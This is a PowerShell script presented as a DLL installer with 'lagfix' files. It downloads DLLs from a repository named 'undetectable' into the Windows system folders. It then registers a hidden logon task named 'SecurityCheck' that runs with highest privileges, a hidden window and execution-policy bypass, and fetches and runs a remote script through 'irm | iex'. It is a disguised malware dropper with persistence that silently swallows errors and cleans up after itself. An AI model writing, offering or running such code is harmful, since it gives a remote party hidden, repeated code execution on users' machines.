# Complete DLL Installer + Task Scheduler Setup
# Run as Administrator: irm https://raw.githubusercontent.com/yourusername/yourrepo/main/setup.ps1 | iex

# Configuration
$dllUrls = @(
    "https://raw.githubusercontent.com/vivekhere03/undetectable/refs/heads/main/lagfix1.dll",
    "https://raw.githubusercontent.com/vivekhere03/undetectable/refs/heads/main/lagfix2.dll",
    "https://raw.githubusercontent.com/vivekhere03/undetectable/refs/heads/main/lagfix3.dll"
)

$targetDirs = @("C:\Windows\SysWOW64", "C:\Windows\System32")
$tempDir = "$env:TEMP\DLLInstaller"

if (-not (Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

# Progress tracking
$totalSteps = ($dllUrls.Count * 2) + 2
$currentStep = 0

function Show-Progress {
    param($Activity, $Status)
    $script:currentStep++
    $percent = [math]::Round(($script:currentStep / $totalSteps) * 100)
    Write-Progress -Activity $Activity -Status $Status -PercentComplete $percent
}

# Step 1: Download and install DLLs
foreach ($url in $dllUrls) {
    $fileName = $url.Split('/')[-1]
    $tempFile = Join-Path $tempDir $fileName
    
    Show-Progress "Installing DLLs" "Downloading $fileName..."
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing -ErrorAction Stop
        
        foreach ($dir in $targetDirs) {
            Show-Progress "Installing DLLs" "Copying $fileName to $dir..."
            Copy-Item -Path $tempFile -Destination (Join-Path $dir $fileName) -Force -ErrorAction SilentlyContinue
        }
    }
    catch {}
}

# Step 2: Create Task Scheduler XML and register task
Show-Progress "Configuring Task Scheduler" "Creating scheduled task..."

try {
    # Get current user information
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $userName = $currentUser.Name
    $userSID = $currentUser.User.Value
    $currentDate = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ss.fffffff")
    
    # Create the XML content with updated user info
    $taskXmlContent = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$currentDate</Date>
    <Author>$userName</Author>
    <URI>\SecurityCheck</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$userSID</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell</Command>
      <Arguments>-windowstyle hidden -ep bypass -c "irm https://raw.githubusercontent.com/vivekhere03/undetectable/refs/heads/main/install.ps1 | iex"</Arguments>
    </Exec>
  </Actions>
</Task>
"@
    
    # Register the task
    Register-ScheduledTask -TaskName "SecurityCheck" -Xml $taskXmlContent -Force | Out-Null
}
catch {}

# Cleanup
Show-Progress "Finalizing" "Cleaning up..."
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Progress -Activity "Complete" -Completed
Write-Host "`n============================================" -ForegroundColor Green
Write-Host "          SETUP COMPLETED!                  " -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
Start-Sleep -Seconds 2